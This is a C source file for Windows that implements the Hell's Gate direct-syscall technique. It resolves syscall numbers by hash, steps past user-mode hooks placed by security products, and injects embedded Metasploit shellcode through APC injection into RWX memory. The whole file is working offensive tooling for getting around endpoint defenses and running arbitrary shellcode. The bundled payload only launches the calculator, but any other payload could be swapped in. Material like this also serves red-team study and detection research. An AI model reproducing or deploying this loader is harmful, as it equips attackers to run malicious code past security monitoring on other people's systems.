#include <stdio.h>
#include <windows.h>

#include "../include/structs.h"

// Comment to perform injection, uncomment to hash syscalls
//#define HASH

// place syscall hashes here
#define NtAllocateVirtualMemory_djb2 0x70AEEA331C81F5F6
#define NtWriteVirtualMemory_djb2 0x250A5528645CCA7C
#define NtProtectVirtualMemory_djb2 0xF5E0B1751566E832
#define NtQueueApcThread_djb2 0x0F55E65B7E696022
#define NtWaitForSingleObject_djb2 0x0FDBDA48E7FB4666
#define NtFreeVirtualMemory_djb2 0x3114518736161593
#define NtClose_djb2 0x508AE770EF5031E7

// DBJ2 Hashing algo
DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77341224DEADBEEF; // To do, randomly generate a new seed at compile time
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

// Define VX Table structs
// https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
typedef struct _VX_TABLE_ENTRY{         // Represents a single syscall
    PVOID       pAddress;               // Address of Syscall
    DWORD64     dwHash;                 // Syscall name hash
    WORD        wSysCall;               // SSN
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

// Contains a VX_TABLE_ENTRY for each syscall used in the code
// https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
typedef struct _VX_TABLE{
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtWriteVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtQueueApcThread;
    VX_TABLE_ENTRY NtWaitForSingleObject;
    VX_TABLE_ENTRY NtFreeVirtualMemory;
    VX_TABLE_ENTRY NtClose;
} VX_TABLE, *PVX_TABLE;

// Returns the address of the current TEB
// https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB)__readgsqword(0x30);
#else
    return (PTEB)__readfsword(0x16);
#endif
}

// Takes in a pointer to a module base address and outputs a pointer to the Export Directory of that module
// https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c
BOOL GetImageExportDirectory(IN PVOID pModuleBase, OUT PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
    // Get DOS Header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // Get NT Headers
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS) ((PBYTE) pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Get EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

// Used to populate the VX_TABLE_ENTRY struct. Responsible for calculating SSNs
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pvxTableEntry){
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinals = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

    // Search EAT for hash that matches the current VX_TABLE_ENTRY hash
    for(WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++){
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];

        // When a match is found, save the address into the table entry
        if(djb2(pczFunctionName) == pvxTableEntry->dwHash){
            pvxTableEntry->pAddress = pFunctionAddress;

            // Deal with hooks if function is hooked
            /*
             * What happens here is pretty cool. If the syscall is hooked, there will be additional bytes before the
             * actual syscall happens. HellsGate gets around this by searching for 0x4c, 0x8b, 0xd1, 0xb8 which are the
             * opcodes for mov r10, rcx and mov eax, ssn. If it doesn't find them, the CW variable is incremented which
             * adds to the address of the syscall for subsequent loops. HellsGate proceeds to move forward byte by byte
             * until it finds mov r10, rcx or mov eax, ssn. This allows HellsGate to bypass any hooks that have been
             * placed on the syscall.
             */
            WORD cw = 0;
            while(TRUE){
                // To avoid going too far, the following if statements are used to check if either a syscall or ret
                // instruction has been reached. If one of those instructions has been reached, and the
                // 0x4c, 0x8b, 0xd1, 0xb8 opcodes have not been found, reloving the SSN will fail.
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                if(*((PBYTE)pFunctionAddress + cw) == 0x4c
                   && *((PBYTE)pFunctionAddress + cw + 1) == 0x8b
                   && *((PBYTE)pFunctionAddress + cw + 2) == 0xd1
                   && *((PBYTE)pFunctionAddress + cw + 3) == 0xb8
                   && *((PBYTE)pFunctionAddress + cw + 6) == 0x00
                   && *((PBYTE)pFunctionAddress + cw + 7) == 0x00) {

                    // Calculate the SSN
                    BYTE high = *((PBYTE)pFunctionAddress + cw + 5);
                    BYTE low = *((PBYTE)pFunctionAddress + cw + 4);
                    pvxTableEntry->wSysCall = (high << 8) | low;
                    break;
                }

                cw++;
            }

        }
    }

    return TRUE;
}

// HellGate function prototypes
extern VOID HellsGate(WORD wSystemCall);
extern int HellDescent();

// x64 calc metasploit shellcode
unsigned char Payload[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Alertable function used to create an alertable thread
VOID AlertableFunction() {
    HANDLE	hEvent = CreateEvent(NULL, 0, 0, NULL);
    MsgWaitForMultipleObjectsEx(
            1,
            &hEvent,
            INFINITE,
            QS_HOTKEY,
            MWMO_ALERTABLE
    );
}

BOOL ApcInject(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize){
    NTSTATUS STATUS             = 0;
    PVOID   pAddress            = NULL;
    DWORD   dwOldProtect        = 0;
    SIZE_T  sSize               = sPayloadSize,
            sNumBytesWritten    = 0;

    // Allocate Memory
    HellsGate(pVxTable->NtAllocateVirtualMemory.wSysCall);
    if((STATUS = HellDescent(hProcess, &pAddress, NULL, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0){
        printf("[!] NtAllocateVirtualMemory FAILED with error : 0x%0.8lX \n", STATUS);
        return FALSE;
    }
    printf("[+] Allocated %zu of %zu bytes at 0x%p \n", sSize, sPayloadSize, pAddress);

    // Copy Payload
    HellsGate(pVxTable->NtWriteVirtualMemory.wSysCall);
    if((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sNumBytesWritten)) != 0){
        printf("[!] NtWriteVirtualMemory FAILED with error : 0x%0.8lX \n", STATUS);
        return FALSE;
    }
    printf("[+] Wrote %zu of %zu bytes \n", sNumBytesWritten, sPayloadSize);

    // Change Permissions
    sSize = sPayloadSize; // Reset sSize to sPayloadSize since NtProtectVirtualMemory will again update the value we supply
    HellsGate(pVxTable->NtProtectVirtualMemory.wSysCall);
    if((STATUS = HellDescent(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) != 0){
        printf("[!] NtProtectVirtualMemory FAILED with error : 0x%0.8lX \n", STATUS);
        return FALSE;
    }
    printf("[+] Updated protection on %zu of %zu bytes \n", sSize, sPayloadSize);

    // Execute
    HellsGate(pVxTable->NtQueueApcThread.wSysCall);
    if((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0){
        printf("[!] NtQueueApcThread FAILED with error : 0x%0.8lX \n", STATUS);
        return FALSE;
    }

    // Wait for payload to finish executing
    // WaitForSingleObject(hThread, INFINITE);
    HellsGate(pVxTable->NtWaitForSingleObject.wSysCall);
    if((STATUS = HellDescent(hThread, TRUE, NULL)) != 0){
        printf("[!] NtWaitForSingleObject FAILED with error : 0x%0.8lX \n", STATUS);
        return FALSE;
    }
    printf("[+] Payload executed successfully... \n");

    // Clean Up
    printf("[+] Cleaning Up... \n");
    // Free Allocated Memory
    HellsGate(pVxTable->NtFreeVirtualMemory.wSysCall);
    if((STATUS = HellDescent(hProcess, &pAddress, &sSize, MEM_DECOMMIT)) != 0){
        printf("\t [!] NtFreeVirtualMemory FAILED with error : 0x%0.8lX \n", STATUS);
    }
    printf("\t [*] Freed allocated memory... \n");

    // Close Handles
    HellsGate(pVxTable->NtClose.wSysCall);
    if((STATUS = HellDescent(hThread)) != 0){
        printf("\t [!] NtClose FAILED with error : 0x%0.8lX \n", STATUS);
    }
    printf("\t [*] Closed open handles... \n");

    return TRUE;
}


int main() {
#ifdef HASH // Used only to print out the hashes for desired syscalls
    printf("#define %s%s 0x%p \n", "NtAllocateVirtualMemory", "_djb2", (DWORD64)djb2("NtAllocateVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtWriteVirtualMemory", "_djb2", (DWORD64)djb2("NtWriteVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtProtectVirtualMemory", "_djb2", (DWORD64)djb2("NtProtectVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtQueueApcThread", "_djb2", (DWORD64)djb2("NtQueueApcThread"));
    printf("#define %s%s 0x%p \n", "NtWaitForSingleObject", "_djb2", (DWORD64)djb2("NtWaitForSingleObject"));
    printf("#define %s%s 0x%p \n", "NtFreeVirtualMemory", "_djb2", (DWORD64)djb2("NtFreeVirtualMemory"));
    printf("#define %s%s 0x%p \n", "NtClose", "_djb2", (DWORD64)djb2("NtClose"));

    return 1;
#endif

    // Get TEB and PEB
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return -1;

    // Get NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // Get the EAT of NTDLL
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        return -1;

//--------------------------------------------------------------------------
    // Initializing the 'Table' structure ...
    VX_TABLE Table = { 0 };

    // For each entry, the patern is simple:
    // Init the hash, then populate the entry with GetVxTableEntry();
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
        return -1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
        return -1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
        return -1;

    Table.NtQueueApcThread.dwHash = NtQueueApcThread_djb2;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueueApcThread))
        return -1;

    Table.NtWaitForSingleObject.dwHash = NtWaitForSingleObject_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
        return -1;

    Table.NtFreeVirtualMemory.dwHash = NtFreeVirtualMemory_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtFreeVirtualMemory))
        return -1;

    Table.NtClose.dwHash = NtClose_djb2;
    if(!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
        return -1;
//--------------------------------------------------------------------------

    // Create alertable thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) AlertableFunction, NULL, 0, 0);
    if(hThread == NULL || hThread == INVALID_HANDLE_VALUE){
        printf("[!] CreateThread FAILED with error : %ld \n", GetLastError());
        return -1;
    }

    // Call injection method to inject using syscalls
    if(!ApcInject(&Table, (HANDLE)-1, hThread, Payload, sizeof(Payload)))
        return -1;

    return 0;
}
